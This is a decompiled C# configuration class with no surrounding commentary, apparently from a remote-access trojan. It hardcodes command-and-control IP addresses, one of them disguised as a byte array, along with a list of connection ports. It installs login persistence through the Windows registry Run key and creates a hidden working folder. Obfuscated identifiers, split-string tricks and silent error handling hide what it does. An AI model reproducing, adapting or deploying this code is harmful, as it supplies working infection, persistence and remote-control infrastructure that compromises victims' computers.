using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace rgiwsdasxa;

internal static class rgiwsdasxaCONF
{
	public static string rgiwsdasxadefaultP = "210.115.241.121|rgiwsdasxa".Split(new char[1] { '|' })[0];

	public static string rgiwsdasxamainApp = "rgiwsdasxa|rgiwsdasxa".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 3386, 8346, 13621, 15468, 18372 };

	public static int rgiwsdasxaport;

	public static byte[] rgiwsdasxavpsips = new byte[14]
	{
		50, 49, 54, 46, 49, 55, 54, 46, 49, 57,
		48, 46, 57, 56
	};

	public static string rgiwsdasxaappPath = "\\Hurmz\\|rgiwsdasxa".Split(new char[1] { '|' })[0];

	public static string rgiwsdasxapc_id = "zhrx|rgiwsdasxa".Split(new char[1] { '|' })[0];

	public static string rgiwsdasxaremvUser = "kdlmnr|rgiwsdasxa".Split(new char[1] { '|' })[0];

	public static string rgiwsdasxafilesLogs = "bilrd".Split(new char[1] { '|' })[0];

	public static string rgiwsdasxaAppPath = "";

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string rgiwsdasxaOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!rgiwsdasxa".Split(new char[1] { '!' })[0];
		}
	}

	public static void rgiwsdasxaset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|rgiwsdasxa".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = rgiwsdasxapc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static string rgiwsdasxaget_mpath()
	{
		if (rgiwsdasxaAppPath != "")
		{
			return rgiwsdasxaAppPath;
		}
		rgiwsdasxaAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + rgiwsdasxaappPath;
		try
		{
			if (!Directory.Exists(rgiwsdasxaAppPath))
			{
				Directory.CreateDirectory(rgiwsdasxaAppPath);
			}
			if (Directory.Exists(rgiwsdasxaAppPath))
			{
				return rgiwsdasxaAppPath;
			}
		}
		catch
		{
		}
		rgiwsdasxaAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + rgiwsdasxaappPath;
		try
		{
			if (!Directory.Exists(rgiwsdasxaAppPath))
			{
				Directory.CreateDirectory(rgiwsdasxaAppPath);
			}
			if (!Directory.Exists(rgiwsdasxaAppPath))
			{
				return rgiwsdasxaAppPath;
			}
		}
		catch
		{
		}
		rgiwsdasxaAppPath = Application.get_ExecutablePath();
		return rgiwsdasxaAppPath;
	}
}
